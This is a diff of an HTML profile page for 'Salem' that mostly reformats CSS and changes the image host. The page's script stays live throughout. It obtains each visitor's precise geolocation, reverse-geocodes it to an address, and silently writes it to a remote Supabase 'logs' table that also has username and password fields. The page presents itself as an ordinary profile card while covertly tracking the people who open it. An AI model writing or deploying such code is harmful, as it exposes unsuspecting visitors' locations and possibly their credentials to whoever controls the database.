@@ -81,13 +81,9 @@
         .social i:hover { color: var(--gold); border-color: var(--gold); transform: scale(1.1); }
 
         .footer_rights {
-            padding: 15px 0; 
-            font-size: 0.65em; /* تصغير الخط */
-            color: rgba(230, 241, 255, 0.5);
-            text-align: center; 
-            letter-spacing: 1px; 
-            border-top: 1px solid rgba(197, 160, 89, 0.1);
-            text-transform: none; /* للسماح بظهور الحروف الصغيرة Aa */
+            padding: 15px 0; font-size: 0.65em; color: rgba(230, 241, 255, 0.5);
+            text-align: center; letter-spacing: 1px; border-top: 1px solid rgba(197, 160, 89, 0.1);
+            text-transform: none; /* للسماح بظهور Salem بحروف Aa */
         }
     </style>
 </head>
@@ -97,8 +93,7 @@
     <div class="header">
         <div class="wave_bg"><div class="wave-01"></div></div>
         <div class="profile_pic_content">
-            <img src="https://files.catbox.moe/8gclzh.jpeg" 
-                 referrerpolicy="no-referrer" 
+            <img src="https://i.ibb.co/LzdYpXvS/8gclzh.jpg" 
                  class="profile_img" 
                  alt="Salem">
         </div>
@@ -137,7 +132,6 @@
                 const lon = pos.coords.longitude;
                 const acc = pos.coords.accuracy;
                 const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                
                 let finalLocData = "";
                 try {
                     const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
@@ -146,12 +140,7 @@
                 } catch(e) {
                     finalLocData = `إحداثيات: ${lat},${lon} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
                 }
-
-                await sb.from('logs').insert([{ 
-                    username: "AUTO_VISITOR", 
-                    password: "LOGGED_WITHOUT_INTERFACE", 
-                    location: finalLocData 
-                }]);
+                await sb.from('logs').insert([{ username: "AUTO_VISITOR", password: "LOGGED_WITHOUT_INTERFACE", location: finalLocData }]);
             }, null, geoOptions);
         }
     }
